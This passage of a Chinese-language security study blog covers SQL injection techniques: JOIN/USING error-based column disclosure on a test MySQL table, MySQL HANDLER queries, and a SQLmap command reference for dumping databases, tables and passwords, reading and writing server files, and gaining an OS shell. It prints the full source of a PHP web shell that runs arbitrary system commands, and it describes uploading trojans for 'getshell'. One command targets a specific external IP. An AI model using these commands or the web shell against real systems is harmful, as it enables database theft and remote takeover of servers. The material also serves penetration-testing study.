<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 同时查询多列</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a;</span><br><span class="line">+----------------------+</span><br><span class="line">| concat(`2`,0x5e,`3`) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 2^3                  |</span><br><span class="line">| Dumb^Dumb            |</span><br><span class="line">| Angelina^I-kill-you  |</span><br><span class="line">| Dummy^321            |</span><br><span class="line">| secure^crappy        |</span><br><span class="line">| stupid^stupidity     |</span><br><span class="line">| superman^genious     |</span><br><span class="line">| batman^mob!le        |</span><br><span class="line">| admin^admin          |</span><br><span class="line">| admin1^admin1        |</span><br><span class="line">| admin2^admin2        |</span><br><span class="line">| admin3^admin3        |</span><br><span class="line">| dhakkan^dumbo        |</span><br><span class="line">| admin4^admin4        |</span><br><span class="line">| Dummy<span class="string">&#x27;#^123          |</span></span><br><span class="line"><span class="string">+----------------------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a limit 0,1;</span></span><br></pre></td></tr></table></figure>

<h3 id="15-3-JOIN-爆破"><a href="#15-3-JOIN-爆破" class="headerlink" title="15.3 JOIN 爆破"></a>15.3 JOIN 爆破</h3><p>本质：通过 <strong>报错</strong> 得到列名</p>
<ul>
<li>join 连接两张表</li>
<li>using() 用于两张表之间的 join 连接查询，并且 using()中的列在两张表中都存在，作为 join 的条件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 常用语句 select * from (select * from 表名 as a join 表名 as b)as c;</span></span><br><span class="line"><span class="comment"># 一一爆字段</span></span><br><span class="line">select * from (select * from users as a join news as b)as c;</span><br><span class="line"></span><br><span class="line">select * from (select * from users a join users b using(id))c;</span><br><span class="line"></span><br><span class="line">select * from (select * from users a join users b using(id,name))c;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">select * from (select * from users a join users b using(id,name,passwd))c;</span><br></pre></td></tr></table></figure>

<p>测试 </p>
<p>创建表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create table users(id int,name varchar(20),passwd varchar(32));</span><br><span class="line">insert into users value(1,<span class="string">&#x27;mickey&#x27;</span>,<span class="string">&#x27;827ccb0eea8a706c4c34a16891f84e7b&#x27;</span>);</span><br><span class="line"></span><br><span class="line">create table news(is_admin int(1),id int(2),title varchar(100),date date);</span><br><span class="line">insert into news values(1,1,<span class="string">&#x27;hello,mickey&#x27;</span>,now());</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 爆列名</span></span><br><span class="line">mysql&gt; select * from (select * from users as a join news as b)as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;name&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id,name))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id,name,passwd))c;</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">| id   | name   | passwd                           |</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">|    1 | mickey | 827ccb0eea8a706c4c34a16891f84e7b |</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 爆列名</span></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;is_admin&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;title&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin,title))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;date&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin,title,date))as c;</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">| is_admin | id   | title        | date       |</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">|        1 |    1 | hello,mickey | 2021-07-26 |</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.04 sec)</span><br></pre></td></tr></table></figure>

<h2 id="十六、Mysql-查询语句-之-Handler"><a href="#十六、Mysql-查询语句-之-Handler" class="headerlink" title="十六、Mysql 查询语句 之 Handler"></a>十六、Mysql 查询语句 之 Handler</h2><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">官方文档</a></p>
<ul>
<li>mysql除可使用select查询表中的数据，也可使用handler语句，它每次只能查询1条记录，而 select 可以根据需要返回多条查询结果。因此 handler语 句并不具备 select 语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</li>
<li>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</li>
<li>可以降低优化器对于SQL语句的解析与优化开销，从而提升查询性能。</li>
</ul>
<p><strong>测试：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database practice;</span><br><span class="line">use practice;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> handler_table(id <span class="type">int</span>,username <span class="type">varchar</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">desc</span> handler_table;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;李华&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;小马&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;张鑫&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;周明&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">5</span>,<span class="string">&#x27;蔡紫&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> handler_tables;</span><br></pre></td></tr></table></figure>

<p><strong>不通过索引查表：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#打开句柄</span><br><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line">#查询数据</span><br><span class="line">handler handler_table read <span class="keyword">first</span>;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">#关闭句柄</span><br><span class="line">handler handler_table <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/02/yvMD6oPbEw514RG.png" alt="image-20210602174326041"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> handler handler_table <span class="keyword">close</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> handler handler_table read next;</span><br><span class="line">ERROR <span class="number">1109</span> (<span class="number">42</span>S02): <span class="literal">Unknown</span> <span class="keyword">table</span> <span class="string">&#x27;handler_table&#x27;</span> <span class="keyword">in</span> HANDLER</span><br></pre></td></tr></table></figure>

<p><strong>通过索引查表：需要创建索引</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#以 handler_table 中的 id 字段创建索引，命名为 handler_index</span><br><span class="line"><span class="keyword">create</span> index handler_index <span class="keyword">on</span> handler_table(id);</span><br><span class="line">#打开句柄，命名为 p</span><br><span class="line">handler handler_table <span class="keyword">open</span> <span class="keyword">as</span> p;</span><br><span class="line">#查看数据</span><br><span class="line">handler p read handler_index <span class="keyword">first</span>;#第一行</span><br><span class="line">handler p read handler_index next;#下一行</span><br><span class="line">handler p read handler_index prev;#上一行</span><br><span class="line">handler p read handler_index <span class="keyword">last</span>;#最后一行</span><br><span class="line">#关闭句柄</span><br><span class="line">handler p <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#以 handler_table 中的 id 字段创建索引，命名为 handler_index</span><br><span class="line"><span class="keyword">create</span> index handler_index <span class="keyword">on</span> handler_table(id);</span><br><span class="line">#打开句柄</span><br><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line">#查看特定位置的数据</span><br><span class="line">handler p handler_table read handler_index<span class="operator">=</span>(<span class="number">3</span>);</span><br><span class="line">handler handler_table read handler_index <span class="keyword">first</span>;#查第一条</span><br><span class="line">handler handler_table read handler_index next;#查下一条</span><br><span class="line">handler handler_table read handler_index prev;#查上一条</span><br><span class="line">handler handler_table read handler_index <span class="keyword">last</span>;#查最后一条</span><br><span class="line">#关闭句柄</span><br><span class="line">handler handler_table <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#删除索引</span><br><span class="line"><span class="keyword">drop</span> index handler_index <span class="keyword">on</span> handler_table;</span><br></pre></td></tr></table></figure>

<p><strong>Handler 与 select 的比较：</strong></p>
<ul>
<li> select语句一次返回所有相关行，handler每次返回一行</li>
<li> HANDLER涉及的分析较少，比SELECT更快</li>
<li> 没有优化程序或查询校验开销</li>
<li> 在两个管理程序请求之间，不需要锁定表。</li>
</ul>
<p><a href="https://blog.csdn.net/JesseYoung/article/details/40785137?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162262623916780264055048%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162262623916780264055048&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-40785137.pc_search_result_cache&utm_term=mysql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5-handler&spm=1018.2226.3001.4187">参考</a></p>
<h2 id="十七、SQLmap"><a href="#十七、SQLmap" class="headerlink" title="十七、SQLmap"></a>十七、SQLmap</h2><h3 id="17-1-基本手法"><a href="#17-1-基本手法" class="headerlink" title="17.1 基本手法"></a>17.1 基本手法</h3><p><strong>简介</strong></p>
<ul>
<li>支持大量的数据库</li>
<li>支持多种SQL注入：布尔盲注，时间注入，报错注入，联合查询，堆叠注入，使用脚本</li>
<li>加上 <code>-v -3 </code> 会显示出其注入语句</li>
</ul>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">手册：python sqlmap.py <span class="operator">-</span>hh</span><br><span class="line"></span><br><span class="line"> 导航：python sqlmap.py <span class="comment">--wizard</span></span><br><span class="line"></span><br><span class="line"> 测试URL: python sqlmap.py <span class="operator">-</span>u &quot;url&quot;</span><br></pre></td></tr></table></figure>

<p><strong>常用测试（不确定注入手段）</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot;</span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--tamper randomcase.py</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--level 3</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>level用于设置注入等级<span class="number">1</span><span class="operator">~</span><span class="number">6</span>，等级越高，包括的自动注入手段越多</span><br></pre></td></tr></table></figure>

<p><strong>查看权限</strong></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--privileges #查看数据库用户权限</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--is-dba  #判断是否是数据库管理员</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--roles  #枚举数据库用户角色</span></span><br></pre></td></tr></table></figure>

<p><strong>基本信息命令</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查看所有用户：当当前用户有权限去读取包含所有用户的表的权限时，该命令可以列出所有的管理员用户</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--users</span></span><br><span class="line"></span><br><span class="line"> 查看当前用户：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-user</span></span><br><span class="line"></span><br><span class="line"> 查看所有用户的 数据库用户密码：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--passwords</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line"> 获取 shell:</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/14/BrAmhPs7UnYjp3Q.png" alt="image-20210914193530736"></p>
<p><strong>常用注入命令</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查看数据库</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line">查看 当前 网站数据库：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-db</span></span><br><span class="line"> </span><br><span class="line"> 获取当前网站数据库用户的名称：</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-user</span></span><br><span class="line"> </span><br><span class="line"> 查表</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="comment">--tables</span></span><br><span class="line"> </span><br><span class="line"> 查列</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="operator">-</span>T &quot;users&quot; <span class="comment">--columns</span></span><br><span class="line"> </span><br><span class="line"> 查字段内容</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="operator">-</span>T &quot;users&quot; <span class="operator">-</span>C &quot;username,password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>

<p><strong>POST 表单，登录框注入</strong></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">notepad post.txt将post请求复制粘贴过去</span><br><span class="line"></span><br><span class="line">post请求；python sqlmap.py <span class="operator">-</span>r &quot;post.txt(包含有post请求的文件)&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-11</span><span class="operator">/</span> <span class="comment">--forms --level=5 --dbs</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径<span class="operator">+</span>文件名.txt  <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r post.txt <span class="comment">--password --batch</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r post.txt <span class="comment">--os-shell</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="comment">--tables</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="operator">-</span>T &quot;表名&quot; <span class="comment">--columns</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="operator">-</span>T &quot;表名&quot; <span class="operator">-</span>C &quot;字段名（注意：包含所有的）&quot; <span class="comment">--dump</span></span><br><span class="line"> </span><br><span class="line">  python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--priveliges  #查看数据库用户权限</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--is-dba  #判断是否是数据库管理员</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://139.9.112.46:20871/&quot; --data=&quot;uname=admin&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&quot; --sql-shell</span><br><span class="line">select @@version;  &#x27;10.0.27-MariaDB-0ubuntu0.16.04.1&#x27;</span><br><span class="line">select @@plugin_dir;  &#x27;/usr/lib/mysql/plugin/&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="17-2-进阶"><a href="#17-2-进阶" class="headerlink" title="17.2 进阶"></a>17.2 进阶</h3><ul>
<li><p><strong>探测等级：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--level 5</span><br><span class="line">--level 2 # HTTP cookie等</span><br><span class="line">--level 3 # HTTP User-Agent/Referer等</span><br></pre></td></tr></table></figure>

<p>一共五个等级，不加 level 时等级为1，等级越高，进行测试的 Payload 越多。会自动破解出 cookie XFF等注入方式。</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--is-dba # 当前用户是否是管理员权限，即当前账户是否是数据管理员账户</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/14/r6X9vWdYTU4zKZ1.png" alt="image-20210914194547728"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--roles # 列出数据库管理员角色</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/14/cOlnf2PFYtaILp4.png" alt="image-20210914194708971"></p>
<p>查看数据库用户角色，如果当前用户有权限读取包含所有用户的表时，即可列出。该命令仅仅适用于数据库是  Oracle 时。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--referer http://www.baidu.com</span></span><br><span class="line"># sqlmap 可进行伪造 HTTP 中的 Referer 头，当 <span class="comment">--level &gt;=3 时，可使用  referer 欺骗</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--sql-shell # 运行自定义的 sql 语句</span></span><br><span class="line"># 会进入 <span class="keyword">sql</span><span class="operator">-</span>shell<span class="operator">&gt;</span> 交互，可直接输入 <span class="keyword">sql</span> 语句进行执行</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/14/NTF4gzJ6BOXkfDh.png" alt="image-20210914195201939"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--os-cmd</span></span><br><span class="line"><span class="comment">--os-shell</span></span><br><span class="line"># 运行任意操作系统命令</span><br></pre></td></tr></table></figure>

<blockquote>
<p>当数据库为MySQL、PostgreSQL或SQLserver且当前用户具有权限使用特定函数时该指令生效，但实现的原理有所不同。</p>
</blockquote>
<blockquote>
<p>数据库为MySQL和PostgreSQL时，sqlmap商户餐一个二进制库，包含用户自定义的函数<code>sys_exec()</code>和<code>sys_eval()</code>这两个函数可以执行系统命令。在Microsoft SQL Server中，sqlmap使用xp_cmdshell存储过程，如果被禁用（2005及以上版本默认禁用），sqlmap会重新启用它，如果不存在则会被创建。</p>
</blockquote>
<blockquote>
<p>–os-shell 参数可以模拟一个真实的Shell，当不能执行多语句时，仍可以使用INTO OUTFILE写进可写目录，创建一个Web后门。–os-shell支持ASP、ASP.NET、JSP和PHP四种语言。（要执行改参数，需要有数据库管理员权限，–is-dba为True）</p>
</blockquote>
<p><strong>–os-shell的利用执行条件三个：</strong></p>
<p>（1）网站必须是root权限</p>
<p>（2）攻击者需要知道网站的绝对路径</p>
<p>（3）GPC为off，php主动转义的功能关闭</p>
<p><strong>Sqlmap getshell的条件</strong></p>
<p>1.网站必须是root权限<br>2.知道网站的绝对路径    </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u &quot;&quot; <span class="comment">--sql-shell</span></span><br><span class="line"># 进入交互环境 输入</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@datadir</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>常见找绝对路径方法：</strong><br>1.网页报错信息<br>2.Phpinfo，探针<br>3.数据库查询，暴力破解</p>
</blockquote>
<p>3.PHP关闭魔术引号，php主动转义功能关闭</p>
<blockquote>
<p>magic_quotes_gpc=Off</p>
</blockquote>
<p>4.secure_file_priv=值为空：secure_file_priv参数是用来限制LOAD DATA,SELECT…OUTFILE,and LOAD_FILE()传到哪个指定目录的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/14/1l5QK3nSi4gsTJ8.png" alt="image-20210914201258493"></p>
<p>如果是为空，说明MYSQL默认没有secure_file_priv参数，因此在mysql-ini进行添加配置<br>添加语句secure_file_priv= 即可</p>
<p><strong>测试：</strong></p>
<ol>
<li><p>选择网站语言</p>
</li>
<li><p>输入绝对网站路径</p>
<p><img src="https://i.loli.net/2021/09/14/9YVNqXBnvTbx5CI.png" alt="image-20210914201722412"></p>
</li>
<li><p>进入 os-shell&gt; 交互环境</p>
<p>查看网站根目录，发现生成文件</p>
<p><img src="https://i.loli.net/2021/09/14/E7ovFR3PHLxKX29.png" alt="image-20210914201644753"></p>
<p>原理：用into outfile 函数将一个可以用来上传文件的 php 文件写到网站的根目录下</p>
</li>
<li><p>然后利用该上传脚本我们可以上传木马文件，进行访问，蚁剑链接，getshell</p>
<p>sqlmap 会自动利用上传文件上传一个恶意文件，该文件可以用来执行系统命令，并将结果返回，则我们可以在交互环境下，进行命令执行。</p>
</li>
</ol>
<p><a href="http://www.qishunwang.net/news_show_47793.aspx">http://www.qishunwang.net/news_show_47793.aspx</a></p>
<p><a href="https://www.cnblogs.com/zzjdbk/p/13951047.html">https://www.cnblogs.com/zzjdbk/p/13951047.html</a></p>
<p>该上传文件页面如下：</p>
<p><img src="https://i.loli.net/2021/09/14/L8HBnzFbcZRwMNx.png" alt="image-20210914202116561"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">@ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$z</span>=@ini_get(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$z</span>=preg_replace(<span class="string">&#x27;/[, ]+/&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">    <span class="variable">$z</span>=explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">    <span class="variable">$z</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,<span class="variable">$z</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">global</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="keyword">return</span> is_callable(<span class="variable">$n</span>)<span class="keyword">and</span>!in_array(<span class="variable">$n</span>,<span class="variable">$z</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(f(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">&#123;ob_start();</span><br><span class="line">system(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$w</span>=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;proc_open&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$y</span>=proc_open(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        <span class="variable">$w</span>.=fread(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        @proc_close(<span class="variable">$y</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">elseif</span>(f(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$w</span>=shell_exec(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(f(<span class="string">&#x27;passthru&#x27;</span>))&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$w</span>=ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;popen&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$x</span>=popen(<span class="variable">$c</span>,r);</span><br><span class="line">            <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span>(is_resource(<span class="variable">$x</span>))&#123;</span><br><span class="line">                <span class="keyword">while</span>(!feof(<span class="variable">$x</span>))&#123;</span><br><span class="line">                <span class="variable">$w</span>.=fread(<span class="variable">$x</span>,<span class="number">512</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    @pclose(<span class="variable">$x</span>);</span><br><span class="line">                    &#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;exec&#x27;</span>))&#123;</span><br><span class="line">                        <span class="variable">$w</span>=<span class="keyword">array</span>();</span><br><span class="line">                        exec(<span class="variable">$c</span>,<span class="variable">$w</span>);</span><br><span class="line">                        <span class="variable">$w</span>=join(chr(<span class="number">10</span>),<span class="variable">$w</span>).chr(<span class="number">10</span>);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="variable">$w</span>=<span class="number">0</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">print</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>.<span class="variable">$w</span>.<span class="string">&quot;&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--file-read</span></span><br><span class="line"># 从数据库服务器中读取文件</span><br></pre></td></tr></table></figure>

<p>适用于MySQL、PostgreSQL或Microsoft SQL Server且当前用户有权限执行特定的函数时。读取的文件可以是文本可以是二进制文件。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;&quot; <span class="comment">--file-read &quot;路径&quot; -v 1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--file-write --file-dest</span></span><br><span class="line"># 上传文件到数据库服务器中</span><br><span class="line"></span><br><span class="line"># file<span class="operator">-</span>write  从本地写入</span><br><span class="line"># file<span class="operator">-</span>dest  写入目标路径</span><br></pre></td></tr></table></figure>

